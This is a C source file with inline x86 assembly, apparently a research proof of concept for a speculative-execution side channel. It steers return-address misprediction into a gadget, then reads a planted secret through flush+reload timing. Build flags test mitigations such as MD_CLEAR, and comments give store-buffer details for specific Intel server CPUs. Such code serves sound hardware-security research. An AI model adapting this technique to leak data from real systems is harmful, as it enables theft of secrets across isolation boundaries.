#include <err.h>
#include <sched.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/mman.h>
#include <sys/prctl.h>
#include <sys/user.h>
#include <unistd.h>
extern void SHADOW_DEST();
extern void ACCESS_PROBE();
extern void EXIT_STORE_FWD();
uint64_t secret_address = 0;
uint8_t probe_array[PAGE_SIZE];
void access_probe() {
  asm volatile("ACCESS_PROBE:\n\t");
  // rax is set to 0x800 inside the shadow branch to eliminate false positives
  // from weird speculation (the gadget address is on the stack after the
  // architectural write).
  asm volatile("movq (%%rdx, %%rax), %%r14\n\t" ::"d"(probe_array));
  asm volatile(
      "nop;nop;nop;nop;nop;nop;nop;nop;\n\t"
      "nop;nop;nop;nop;nop;nop;nop;nop;\n\t"
      "nop;nop;nop;nop;nop;nop;nop;nop;\n\t"
      "nop;nop;nop;nop;nop;nop;nop;nop;\n\t"
      "nop;nop;nop;nop;nop;nop;nop;nop;\n\t"
      "nop;nop;nop;nop;nop;nop;nop;nop;\n\t"
      "nop;nop;nop;nop;nop;nop;nop;nop;\n\t"
      "nop;nop;nop;nop;nop;nop;nop;nop;\n\t"
#ifdef SPECULATIVE_WRITE
      "ret\n\t"
#else
      "nop\n\t"
#endif
      "lfence;mfence;\n\t");
}
static __attribute__((noinline)) void flush_probe() {
  asm volatile(
      "movq (%1), %1\n\t"
      "add %1, %0\n\t"
      "clflush 0(%0)\n\t"
      "lfence; mfence\n\t" ::"r"(probe_array),
      "r"(secret_address));
}
static inline uint64_t rdtsc_begin() {
  uint64_t a, d;
  asm volatile(
      "mfence\n\t"
      "CPUID\n\t"
      "RDTSCP\n\t"
      "mov %%rdx, %0\n\t"
      "mov %%rax, %1\n\t"
      "mfence\n\t"
      : "=r"(d), "=r"(a)
      :
      : "rax", "rbx", "rcx", "rdx");
  a = (d << 32) | a;
  return a;
}
static inline uint64_t rdtsc_end() {
  uint64_t a, d;
  asm volatile(
      "mfence\n\t"
      "RDTSCP\n\t"
      "mov %%rdx, %0\n\t"
      "mov %%rax, %1\n\t"
      "CPUID\n\t"
      "mfence\n\t"
      : "=r"(d), "=r"(a)
      :
      : "rax", "rbx", "rcx", "rdx");
  a = (d << 32) | a;
  return a;
}
size_t threshold = 100;
int __attribute__((noinline)) check_probe() {
  register uint64_t secret = 0;
  asm volatile(
      "movq (%1), %%rax\n\t"
      "mov %%rax, %0\n\t"
      "lfence\n\t"
      : "=r"(secret)
      : "r"(secret_address)
      : "rax");
  uint64_t start = rdtsc_begin();
  asm volatile("mov (%0, %1), %%rax" ::"r"(probe_array), "r"(secret) : "rax");
  uint64_t end = rdtsc_end();
  flush_probe();
  return (end - start) < threshold;
}
void *__attribute__((noinline)) map_or_die(void *addr, size_t sz) {
  int flags = MAP_ANONYMOUS | MAP_PRIVATE;
  if (addr) flags |= MAP_FIXED;
  void *m = mmap(addr, sz, PROT_READ | PROT_WRITE, flags, -1, 0);
  if (m == MAP_FAILED) err(1, "mmap");
  if (addr && m != addr) errx(1, "mmap: did not return requested address");
  return m;
}
void __attribute__((noinline)) fill_page(uint8_t *page) {
  for (int i = 0; i < PAGE_SIZE; ++i) {
    page[i] = rand() % 0xff;
  }
}
uint64_t __attribute__((noinline)) allocate_secret() {
  void *address = map_or_die(NULL, PAGE_SIZE);
#ifndef FAIL_SECRET_VALUE
  *((uint64_t *)address) = 0x800;
#else
  *((uint64_t *)address) = 0x600;
#endif
  return (uint64_t)address;
}
size_t nhits = 0, nruns = 0;
char print_text[] = "threshold: %zu\thits: %zu\truns: %zu\n";
uint64_t page = 0;
uint64_t ds = 0;
int main() {
  page = (uint64_t)map_or_die(NULL, PAGE_SIZE);
  secret_address = allocate_secret();
  while (1) {
    fill_page((uint8_t *)page);
    flush_probe();
#ifndef NO_RSB_FILLING  // default on. sorry for the double negation
    asm volatile(
        "mfence\n\t"
        ".rept 64\n\t"
        ".align 8\n\t"
        "call .+5\n\t"
        "mfence\n\t"
        ".endr\n\t" ::
            :);
#endif
    // nop sled
    asm volatile(
        ".align 64; .rept 4\n\t"
        ".rept 64; nop; .endr\n\t"
        ".endr");
    asm volatile(
#ifndef SPECULATIVE_WRITE
        // gadget address is on top of the stack
        "sub $0x57, %%rdx; push %%rdx\n\t"
        "lfence\n\t"
#endif
#ifndef FAIL_SHADOW_BRANCH_MISP
        // flush the shadown branch operand
        "lfence; clflush (%%rdi); lfence; mfence\n\t"
#endif
#ifdef FAIL_UNCACHED_RSP
        // TODO: sometimes hits still show up
        "lfence;clflush (%%rsp); lfence; mfence\n\t"
#endif
#ifdef FAIL_MD_CLEAR
        // TODO: not reliable yet
        "mov %%ds, (%%rsi)\n\t"
        "verw (%%rsi)\n\t"
        "lfence\n\t"
#else
        ".rept 8; nop; .endr\n\t"
#endif
        ".align 16\n\t"
        "SHADOW_BRANCH:\n\t"
        "cmp %%rax, (%%rdi)\n\t"
        // This branch is always taken
        "jnz SHADOW_DEST\n\t"
        "mov $0x800, %%rax\n\t"
#ifdef SPECULATIVE_WRITE
        // tests if the PoC works if rsp points to a value written in the
        // speculation window before the ret; Signal is present for # ret
        // instructions <= 42, where the 42nd ret jumps to the gadget.
        // (On Boadwell Server)
        // For { Skylake Server, Cascadelake}, # of ret instructions <= 56
        // This is due to store to load forwarding. The sizes mentioned about
        // are the store buffer size for each model.
        "sub $0x57, %%rax\n\t"
        "mov %%rax, (%%rsp)\n\t"
#endif
        ".align 64\n\t"
        "ret\n\t"
        "nop\n\t" ::
#ifndef FAIL_GADGET_ADDRESS
            "a"(ACCESS_PROBE + 0x57),
        "d"(ACCESS_PROBE + 0x57),
#else
            "a"(0x4141414141414141),
        "d"(0x4141414141414141),
#endif
        "D"(page), "S"(&ds)
        : "cc");
    // fix the stack
    asm volatile(
        "SHADOW_DEST:\n\t"
#ifndef SPECULATIVE_WRITE
        "nop; pop %%rax\n\t"
#endif
#ifndef NO_RSB_FILLING  // cleanup stack after RSB filling
        "add $512, %%rsp\n\t"
#endif
        ::
            : "rax");
    if (check_probe()) {
      nhits++;
    }
    if (!(++nruns % 10000)) {
      printf(print_text, threshold, nhits, nruns);
      nhits = 0;
      nruns = 0;
    }
  }
}
